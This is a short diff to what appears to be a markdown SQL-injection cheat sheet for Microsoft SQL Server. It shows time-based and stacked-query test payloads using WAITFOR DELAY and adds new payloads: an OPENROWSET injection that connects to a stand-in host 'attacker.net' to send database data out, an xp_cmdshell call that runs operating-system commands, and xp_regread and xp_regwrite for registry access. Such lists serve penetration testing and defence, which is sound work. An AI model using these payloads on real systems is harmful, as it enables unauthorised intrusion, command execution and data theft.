@@ -49,6 +49,10 @@
     WAITFOR DELAY '0:0:5'
     ```
   - Check support for stacked queries: `-1" AND 1=2; WAITFOR DELAY '0:0:5'; -- "`
+- `insert into openrowset(‘SQLOLEDB’,‘DRIVER={SQL Server};SERVER=attacker.net,80;UID=sa;PWD=letmein’, ‘select * from foo’) values (@@version)`
+- `master..xp_cmdshell ‘ipconfig`
+- `xp_regread`
+- `xp_regwrite`
 
 
 ## Tools 
